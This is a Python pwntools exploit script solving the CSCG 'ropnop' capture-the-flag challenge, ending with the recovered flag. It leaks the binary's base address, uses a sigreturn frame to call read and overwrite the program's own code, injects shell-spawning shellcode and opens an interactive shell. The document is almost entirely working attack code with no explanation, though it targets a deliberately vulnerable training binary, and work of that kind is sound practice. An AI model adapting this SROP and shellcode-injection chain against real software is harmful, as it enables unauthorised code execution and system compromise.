#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("ropnop")
libc = exe.libc

r = None
def connect(fresh=True, local=False):
    global r
    if r is not None:
        if fresh:
            r.close()
        else:
            return
    r = remote("hax1.allesctf.net", 9300) if args.REMOTE and not local else exe.process()

connect()

exe.address = int(r.recvline_contains("defusing").decode().split()[3], 16)
info("exe base: %#x", exe.address)

# sigreturn to read
frame = SigreturnFrame(kernel="amd64")
frame.rdi = 0
frame.rsi = exe.symbols.read
frame.rdx = 0x100
frame.rip = exe.symbols.read
frame.rsp = exe.symbols.read

r.send(flat({
    0x10: 0x0 , # rbp
    0x18: [
        exe.symbols.read, # to set rax
        exe.symbols.gadget_shop + 4, frame # sigreturn
    ]
}))

sleep(2)

r.send("A"*int(constants.SYS_rt_sigreturn))

sleep(2)

r.send(flat({
    0x0: exe.symbols.read + 0x20,
    0x20: asm(shellcraft.sh())
}))

r.interactive()

# CSCG{s3lf_m0d1fy1ng_c0dez!}
